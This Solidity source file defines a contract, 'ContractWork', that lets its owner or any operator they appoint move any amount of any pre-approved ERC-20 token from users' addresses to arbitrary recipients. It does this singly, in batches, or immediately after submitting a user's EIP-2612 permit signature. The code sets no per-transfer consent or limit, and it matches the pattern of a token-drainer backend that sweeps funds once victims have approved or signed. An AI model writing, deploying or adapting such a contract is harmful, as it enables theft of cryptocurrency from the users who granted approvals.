// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// --- minimalist interfaces ---
interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

/// --- minimal Ownable ---
abstract contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed prev, address indexed next);

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address next) external onlyOwner {
        require(next != address(0), "ZERO_ADDR");
        emit OwnershipTransferred(owner, next);
        owner = next;
    }
}

/// --- minimal ReentrancyGuard ---
abstract contract ReentrancyGuard {
    uint256 private _status = 1;

    modifier nonReentrant() {
        require(_status == 1, "REENTRANCY");
        _status = 2;
        _;
        _status = 1;
    }
}

/// @title ContractWork — tokens are debited ONLY by decision of the admin/operator,
/// given that users have pre-approved this contract.
contract ContractWork is Ownable, ReentrancyGuard {
    /// Operators (add backend EOAs/bots)
    mapping(address => bool) public operators;

    event OperatorSet(address indexed op, bool enabled);
    event Pulled(address indexed operator, address indexed token, address indexed from, address to, uint256 amount);
    event NativeSwept(address indexed to, uint256 amount);
    event ERC20Swept(address indexed token, address indexed to, uint256 amount);

    modifier onlyOperator() {
        require(msg.sender == owner || operators[msg.sender], "NOT_OPERATOR");
        _;
    }

    function setOperator(address op, bool enabled) external onlyOwner {
        operators[op] = enabled;
        emit OperatorSet(op, enabled);
    }

    /// @dev Supports both standard ERC-20 and legacy tokens like Ethereum USDT,
    /// which successfully execute transfer/transferFrom but do not return a boolean.
    function _callOptionalReturn(address token, bytes memory data, string memory errorMessage) internal {
        require(token != address(0), "ZERO_TOKEN");

        (bool ok, bytes memory returndata) = token.call(data);
        require(ok, errorMessage);

        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), errorMessage);
        }
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, amount),
            "TRANSFER_FROM_FAIL"
        );
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(IERC20.transfer.selector, to, amount),
            "TRANSFER_FAIL"
        );
    }

    /// @notice Transfers a specific ERC-20 token from the user to a designated recipient. Requires approval (from -> this).
    function pull(address token, address from, address to, uint256 amount)
        external
        onlyOperator
        nonReentrant
    {
        require(token != address(0) && from != address(0) && to != address(0) && amount > 0, "BAD_ARGS");

        _safeTransferFrom(token, from, to, amount);

        emit Pulled(msg.sender, token, from, to, amount);
    }

    /// @notice Batch: transfer multiple records as tuples of (token, from, to, amount).
    function pullBatch(
        address[] calldata tokens,
        address[] calldata froms,
        address[] calldata tos,
        uint256[] calldata amounts
    ) external onlyOperator nonReentrant {
        uint256 n = tokens.length;
        require(n == froms.length && n == tos.length && n == amounts.length, "LEN_MISMATCH");

        for (uint256 i = 0; i < n; i++) {
            uint256 amt = amounts[i];

            if (amt == 0) {
                continue;
            }

            require(tokens[i] != address(0) && froms[i] != address(0) && tos[i] != address(0), "BAD_ITEM");

            _safeTransferFrom(tokens[i], froms[i], tos[i], amt);

            emit Pulled(msg.sender, tokens[i], froms[i], tos[i], amt);
        }
    }

    /// @notice EIP-2612: permit + immediate debit (if the token supports permit).
    function permitAndPull(
        address token,
        address from,
        address to,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external onlyOperator nonReentrant {
        require(token != address(0) && from != address(0) && to != address(0) && value > 0, "BAD_ARGS");

        IERC20Permit(token).permit(from, address(this), value, deadline, v, r, s);

        _safeTransferFrom(token, from, to, value);

        emit Pulled(msg.sender, token, from, to, value);
    }

    /// --- Emergency withdrawals of tokens or ETH accidentally stuck in the contract ---
    receive() external payable {}

    function sweepNative(address payable to, uint256 amount) external onlyOwner {
        require(to != address(0), "ZERO_ADDR");

        if (amount == type(uint256).max) {
            amount = address(this).balance;
        }

        (bool ok,) = to.call{value: amount}("");
        require(ok, "NATIVE_SEND_FAIL");

        emit NativeSwept(to, amount);
    }

    function sweepERC20(address token, address to, uint256 amount) external onlyOwner {
        require(token != address(0) && to != address(0), "BAD_ARGS");

        if (amount == type(uint256).max) {
            amount = IERC20Balance(token).balanceOf(address(this));
        }

        _safeTransfer(token, to, amount);

        emit ERC20Swept(token, to, amount);
    }
}

interface IERC20Balance {
    function balanceOf(address account) external view returns (uint256);
}